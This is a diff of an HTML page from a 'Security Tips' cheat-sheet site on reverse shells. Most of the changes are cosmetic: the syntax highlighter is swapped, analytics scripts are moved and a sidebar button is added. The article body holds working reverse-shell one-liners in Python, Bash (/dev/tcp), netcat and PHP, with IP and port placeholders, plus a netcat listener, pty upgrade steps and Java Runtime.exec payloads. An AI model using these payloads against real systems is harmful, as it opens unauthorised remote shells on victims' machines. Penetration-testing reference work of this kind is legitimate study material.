@@ -10,7 +10,6 @@
   <link rel="shortcut icon" href="../img/favicon.ico">
   <title>Reverse Shell - Security Tips</title>
   <link rel="stylesheet" href="../css/style.css" type="text/css" />
-  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
   
   <script>
     // Current page data
@@ -20,31 +19,19 @@
   </script>
   
   <script src="../js/jquery-2.1.1.min.js" defer></script>
-  <script src="../js/modernizr-2.8.3.min.js" defer></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/yaml.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/powershell.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/bash.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/nginx.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>
-  <script>hljs.initHighlightingOnLoad();</script> 
-  
-  <script>
-      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-
-      ga('create', 'UA-128044070-2', 'security-tips.vincd.com');
-      ga('send', 'pageview');
-  </script>
-  
+  <script src="../js/modernizr-2.8.3.min.js" defer></script> 
 </head>
 
 <body class="ready sticky">
+  <button class="sidebar-toggle">
+    <div class="sidebar-toggle-button">
+      <span></span>
+      <span></span>
+      <span></span>
+    </div>
+  </button>
 
   <main>
-
     
     <aside class="sidebar">
       <div class="search">
@@ -54,7 +41,7 @@
 		</form>
 	</div>
 </div>
-      
+
       <h1 class="app-name"><a class="app-name-link" data-nosearch="" href="/">Security Tips</a></h1>
 
       <div class="sidebar-nav">
@@ -244,42 +231,43 @@ with a couple <code>IP:port</code> the server can access. Then, on your local ma
 a listener with <code>netcat</code>:</p>
 <h2 id="on-local-machine">On local machine</h2>
 <p>To listen for an incoming connection and upgrade to a pty shell:</p>
-<pre><code class="bash">nc -lvnp {PORT}
+<pre><code class="language-bash">nc -lvnp {PORT}
 
 # after the connection is established
 python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
 </code></pre>
 
 <p>Then, <code>Ctrl-Z</code> and type:</p>
-<pre><code class="bash">stty raw -echo
+<pre><code class="language-bash">stty raw -echo
 </code></pre>
 
 <p>The console should be black, next foreground the shell with <code>fg</code> then
 reinitialize the terminal with <code>reset</code>.</p>
 <h2 id="on-the-remote-server">On the remote server</h2>
 <h3 id="windows">Windows</h3>
-<pre><code class="bash">&gt; cmd.exe /C &lt;cmd&gt;
+<pre><code class="language-bash">&gt; cmd.exe /C &lt;cmd&gt;
 </code></pre>
 
 <h3 id="python">Python</h3>
-<pre><code class="bash">python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{IP}\\&quot;,{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);\'
+<pre><code class="language-bash">python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\&quot;{IP}\\&quot;,{Port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\&quot;/bin/sh\\&quot;,\\&quot;-i\\&quot;]);\'
 </code></pre>
 
 <h3 id="bash">Bash</h3>
-<pre><code class="bash">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
+<pre><code class="language-bash">bash -i &gt;&amp; /dev/tcp/{IP}/{PORT} 0&gt;&amp;1
 </code></pre>
 
 <h3 id="netcat">Netcat</h3>
-<pre><code class="bash">nc -e /bin/sh {IP} {PORT}
+<pre><code class="language-bash">nc -e /bin/sh {IP} {PORT}
 </code></pre>
 
 <h3 id="java">Java</h3>
-<pre><code class="java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
+<pre><code class="language-java">r = Runtime.getRuntime();p = r.exec([&quot;your payload&quot;] as String[]);p.waitFor()
+String[] cmd={&quot;cmd&quot;,&quot;/C&quot;,&quot;&lt;cmd&gt;&quot;};Runtime.getRuntime().exec(cmd);
 </code></pre>
 
 <p>This payload can also work with <code>BeanShell</code> scripts.</p>
 <h3 id="php">PHP</h3>
-<pre><code class="bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
+<pre><code class="language-bash">php -r '\$sock=fsockopen(\&quot;{IP}\&quot;,{PORT});exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);'
 </code></pre>
             
           </div>
@@ -293,7 +281,7 @@ reinitialize the terminal with <code>reset</code>.</p>
         </div>
       </article>
     </section>
-  </div>
+  </main>
 
   <div class="rst-versions" role="note" style="cursor: pointer">
     <span class="rst-current-version" data-toggle="rst-current-version">
@@ -307,8 +295,27 @@ reinitialize the terminal with <code>reset</code>.</p>
     </span>
 </div>
     <script>var base_url = '..';</script>
-    <script src="../js/theme.js" defer></script>
-      <script src="../search/main.js" defer></script>
+    <script src="../js/theme.js"></script>
+    <script src="../js/prism-core.min.js"></script>
+    <script src="../js/prism-clike.min.js"></script>
+    <script src="../js/prism-yaml.min.js"></script>
+    <script src="../js/prism-powershell.min.js"></script>
+    <script src="../js/prism-bash.min.js"></script>
+    <script src="../js/prism-nginx.min.js"></script>
+    <script src="../js/prism-python.min.js"></script>
+    <script src="../js/prism-markup.min.js"></script>
+    <script src="../search/main.js"></script>
+    
+    <script>
+      (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+      ga('create', 'UA-128044070-2', 'security-tips.vincd.com');
+      ga('send', 'pageview');
+    </script>
+    
 
 </body>
 </html>
